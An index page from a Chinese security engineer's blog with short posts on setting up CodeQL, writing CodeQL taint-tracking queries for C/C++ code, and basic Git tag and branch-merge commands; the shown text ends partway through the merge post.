<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/orange/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"ihongren.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"auto","version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="一个酷爱编程的安全工程师">
<meta property="og:type" content="website">
<meta property="og:title" content="gelen&#39;s blog">
<meta property="og:url" content="https://ihongren.github.io/page/6/index.html">
<meta property="og:site_name" content="gelen&#39;s blog">
<meta property="og:description" content="一个酷爱编程的安全工程师">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="gelen">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://ihongren.github.io/page/6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/6/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>gelen's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  
  <main class="main">


    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">gelen's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
        
      </ul>


      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="gelen"
      src="/images/avatar2.gif">
  <p class="site-author-name" itemprop="name">gelen</p>
  <div class="site-description" itemprop="description">一个酷爱编程的安全工程师</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">75</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/o0x1024" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;o0x1024" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/o0x1024@gmail" title="E-Mail → o0x1024@gmail" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    


        <div class="twopeople">
               <div class="container" style="height:200px;">
                   <canvas class="illo" width="400" height="400" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 300px;"></canvas>
               </div>
               <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople1.js"></script>
               <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/zdog.dist.js"></script>
               <script id="rendered-js" src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople.js"></script>
               <style>
                   .twopeople{
                       margin: 0;
                       align-items: center;
                       justify-content: center;
                       text-align: center;
                   }
                   canvas {
                       display: block;
                       margin: 0 auto;
                       cursor: move;
                   }
               </style>
             </div>
        </div>



  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/CodeQL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/CodeQL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">CodeQL环境搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:55:39 / 修改时间：11:38:01" itemprop="dateCreated datePublished" datetime="2024-09-10T10:55:39+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="0x0-工具准备"><a href="#0x0-工具准备" class="headerlink" title="0x0 工具准备"></a>0x0 工具准备</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CodeQL [1]</span><br><span class="line">codeql-cli-binaries [2]</span><br><span class="line">mvn [3]</span><br><span class="line">jdk-all [4]</span><br><span class="line">vscode [5]</span><br><span class="line">vscode codeql插件 </span><br></pre></td></tr></table></figure>

<h4 id="0x1-环境配置"><a href="#0x1-环境配置" class="headerlink" title="0x1 环境配置"></a>0x1 环境配置</h4><h5 id="JDK配置"><a href="#JDK配置" class="headerlink" title="JDK配置"></a>JDK配置</h5><p>windows路径</p>
<blockquote>
<p>C:\Users\0xkda.m2\toolchains.xml</p>
</blockquote>
<p>mac osx路径</p>
<blockquote>
<p>~&#x2F;.m2&#x2F;toolchains.xml</p>
</blockquote>
<p>根据实际路径和版本进行配置即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF8&quot;?&gt;</span><br><span class="line">&lt;toolchains&gt;</span><br><span class="line">  &lt;!-- JDK toolchains --&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.7&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.7.0_80&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">    &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;11&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk-11.0.13&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.8&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.8.0_291&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;9&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk-9&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- other toolchains --&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="mvn配置"><a href="#mvn配置" class="headerlink" title="mvn配置"></a>mvn配置</h5><p>下载mvn解压后，把mvn.exe所在目录加入到环境变量</p>
<h5 id="codeql-cli-binaries配置"><a href="#codeql-cli-binaries配置" class="headerlink" title="codeql-cli-binaries配置"></a>codeql-cli-binaries配置</h5><p>下载codeql-cli文件，解压，<em><strong>加入环境变量</strong></em>，记住解压路径，后续vscode需要填写</p>
<h5 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h5><p>首先下载codeql插件<br><img src="/images/blog/57ce484f5d66179dc7762ceff1b30cc3.png"></p>
<p>然后设置codeql-cli，点击右下角的<em><strong>设置</strong></em>按钮-&gt; <em><strong>扩展设置</strong></em><br><img src="/images/blog/e76b36b6cf4a84d7676f3f99ffe0818e.png"></p>
<p>在Executable Path中填入我们上面下载的codeql-cli中的codeql.exe文件路径<br><img src="/images/blog/d0465d625b38296f5e23b3c4abbdf489.png"></p>
<p>设置查询线程数，默认是1个线程，太慢了，这里可以根据自己的配置调整<br><img src="/images/blog/a13ae6e244c8a46fa5c31defc18296cc.png"></p>
<h4 id="0x-链接"><a href="#0x-链接" class="headerlink" title="0x 链接"></a>0x 链接</h4><p>[1] <a target="_blank" rel="noopener" href="https://github.com/github/codeql">https://github.com/github/codeql</a><br>[2] <a target="_blank" rel="noopener" href="https://github.com/github/codeql-cli-binaries/releases">https://github.com/github/codeql-cli-binaries/releases</a><br>[3] <a target="_blank" rel="noopener" href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a><br>[4] <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html</a><br>[5] <a target="_blank" rel="noopener" href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Codeql-%E5%85%A8%E5%B1%80%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Codeql-%E5%85%A8%E5%B1%80%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA/" class="post-title-link" itemprop="url">Codeql-全局污点追踪</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:54:57 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T10:54:57+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="全局污点追踪"><a href="#全局污点追踪" class="headerlink" title="全局污点追踪"></a>全局污点追踪</h3><p>与局部污点追踪类似，全局污点追踪针对的是全局数据流。全局污点追踪通过其他不保留值的步骤来扩展了全局数据流。</p>
<p>通过继承<strong>TaintTracking::Configuration</strong>类以使用全局污点追踪的库函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this = &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在配置中定义了以下谓词：</p>
<blockquote>
<p>isSource：定义污点可能从何处流出<br>isSink：定义污点可能流入的地方<br>isSanitizer：可选，限制污点流<br>isSanitizerGuard：可选，限制污点流<br>isAdditionalTaintStep：可选，添加其他污染步骤<br>使用谓词hasFlow(DataFlow::Node source, DataFlow::Node sink)以执行污点追踪分析。</p>
</blockquote>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>以下数据流分析用于追踪从环境变量到打开文件的数据流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class EnvironmentToFileConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  EnvironmentToFileConfiguration() &#123; this = &quot;EnvironmentToFileConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists (Function getenv |</span><br><span class="line">      source.asExpr().(FunctionCall).getTarget() = getenv and</span><br><span class="line">      getenv.hasQualifiedName(&quot;getenv&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() = fc.getArgument(0) and</span><br><span class="line">      fc.getTarget().hasQualifiedName(&quot;fopen&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Expr getenv, Expr fopen, EnvironmentToFileConfiguration config</span><br><span class="line">where config.hasFlow(DataFlow::exprNode(getenv), DataFlow::exprNode(fopen))</span><br><span class="line">select fopen, &quot;This &#x27;fopen&#x27; uses data from $@.&quot;,</span><br><span class="line">  getenv, &quot;call to &#x27;getenv&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>以下污点追踪代码用于追踪从调用ntohl到操作数组索引的数据流。该代码使用Guards库以识别经过边界检查的表达式，同时还定义了谓词isSanitizer以避免污点分析经过特定数据，最后定义了isAdditionalTaintStep用于将流从边界循环添加至循环索引。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class NetworkToBufferSizeConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  NetworkToBufferSizeConfiguration() &#123; this = &quot;NetworkToBufferSizeConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node node) &#123;</span><br><span class="line">    node.asExpr().(FunctionCall).getTarget().hasGlobalName(&quot;ntohl&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node node) &#123;</span><br><span class="line">    exists(ArrayExpr ae | node.asExpr() = ae.getArrayOffset())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(Loop loop, LoopCounter lc |</span><br><span class="line">      loop = lc.getALoop() and</span><br><span class="line">      loop.getControllingExpr().(RelationalOperation).getGreaterOperand() = pred.asExpr() |</span><br><span class="line">      succ.asExpr() = lc.getVariableAccessInLoop(loop)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    exists(GuardCondition gc, Variable v |</span><br><span class="line">      gc.getAChild*() = v.getAnAccess() and</span><br><span class="line">      node.asExpr() = v.getAnAccess() and</span><br><span class="line">      gc.controls(node.asExpr().getBasicBlock(), _)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node ntohl, DataFlow::Node offset, NetworkToBufferSizeConfiguration conf</span><br><span class="line">where conf.hasFlow(ntohl, offset)</span><br><span class="line">select offset, &quot;This array offset may be influenced by $@.&quot;, ntohl,</span><br><span class="line">  &quot;converted data from the network&quot;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Git%E6%96%B0%E5%BB%BATAG/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Git%E6%96%B0%E5%BB%BATAG/" class="post-title-link" itemprop="url">Git新建TAG</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:04:21 / 修改时间：10:04:25" itemprop="dateCreated datePublished" datetime="2024-09-10T10:04:21+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>查看tag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F:\project\code\&gt;git tag</span><br><span class="line">1.0</span><br><span class="line">v0.0.2</span><br><span class="line">v0.0.3</span><br><span class="line">v2.0</span><br></pre></td></tr></table></figure>

<p>新建tag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag v2.1</span><br></pre></td></tr></table></figure>

<p>push代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin v2.1</span><br></pre></td></tr></table></figure>

<p>删除本地tag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -d v20190514</span><br></pre></td></tr></table></figure>

<p>删除远程tag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin :refs/tags/v20190514</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Git%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Git%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/" class="post-title-link" itemprop="url">Git合并分支操作</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:04:02 / 修改时间：10:04:06" itemprop="dateCreated datePublished" datetime="2024-09-10T10:04:02+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>开发分支：</p>
<ul>
<li>dev</li>
</ul>
<p>主分支：</p>
<ul>
<li>master</li>
</ul>
<p>先更新代码到待合并的分支</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#x27;dev&#x27;</span><br><span class="line">git push -u origin dev</span><br></pre></td></tr></table></figure>
<p>然后我们要把dev分支的代码合并到master分支上</p>
<p>首先切换到master分支上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure>
<p>如果是多人开发的话 需要把远程master上的代码pull下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure>
